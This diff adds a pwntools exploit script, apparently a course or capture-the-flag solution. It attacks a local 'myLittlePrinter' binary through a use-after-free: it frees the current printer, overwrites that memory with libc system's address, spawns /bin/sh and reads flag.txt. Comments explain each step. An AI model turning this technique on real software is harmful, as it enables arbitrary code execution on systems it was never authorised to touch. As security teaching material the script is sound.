@@ -1,0 +1,77 @@
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+from os import system
+from pwn import *
+
+exe = context.binary = ELF("./myLittlePrinter", checksec=False)
+context.log_level = "error"
+
+
+def start(argv=[], *a, **kw):
+    gdbscript = """
+    tbreak main
+    continue
+    """.format(
+        **locals()
+    )
+
+    if args.GDB:
+        context.log_level = "debug"
+        context.terminal = ["tmux", "split", "-h"]
+        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, aslr=False, *a, **kw)
+    else:
+        return process([exe.path] + argv, *a, **kw)
+
+# you can also create new functions here
+
+def main():
+    global io
+    io = start()
+
+    # grabbing the system addr 
+    system_addr = io.libc.symbols["system"]
+    system_addr = struct.pack('<Q', system_addr)
+    
+    # This is the same vulnerability as in Task 30 (yeah we started with 30)
+    # in the print section is the following part we exploit here
+    # main:146 (*current_printer->print_function)(buffer);
+    # now we just write "/bin/sh" into the buffer, and change the print_function to system
+    # as mentioned in the lecture the vulnerability here is the pointer
+    # when a printer is current and gets deleted the memory is free but the pointer ist consistent
+    # the exploit happends when we call the print function as this concludes the deleted printer
+    # in limited bounds we can then write the content we want at the place where the deleted printer was and use the pointer to execute it
+    # aswell as last time we also added a pdf with a picture here
+
+    # create new printer
+    io.recv().decode("utf-8")
+    io.sendline(b"1")
+    io.sendline(b"2")
+
+    # set this printer as current
+    io.recv().decode("utf-8")
+    io.sendline(b"3")
+    io.sendline(b"0")
+    
+    # delete the printer we just created 
+    io.recv().decode("utf-8")
+    io.sendline(b"2")
+    io.sendline(b"0")
+
+    # create a user with the system addr we grabbed earlier as name
+    io.recv().decode("utf-8")
+    io.sendline(b"4")
+    io.recv().decode("utf-8")
+    io.sendline(system_addr)
+
+    # now we print /bin/sh 
+    io.recv()
+    io.sendline(b"6")
+    io.recv().decode("utf-8")
+    io.sendline(b"/bin/sh")
+
+    # at this point we should have a shell
+    io.sendline(b"cat flag.txt")
+    print(io.recvuntil(b"}").decode("utf-8"))
+
+if __name__ == "__main__":
+    main()
